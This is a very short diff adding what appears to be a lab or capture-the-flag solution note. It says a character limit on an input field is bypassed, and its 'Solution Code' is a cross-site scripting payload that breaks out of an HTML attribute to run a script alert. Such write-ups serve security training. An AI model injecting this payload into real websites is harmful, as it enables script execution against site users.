@@ -1,0 +1,3 @@
+In this section, the character count is limited. By increasing it and subtracting it from the value, we can achieve the desired result.
+
+Solution Code= "><script>alert(document.domain)</script>
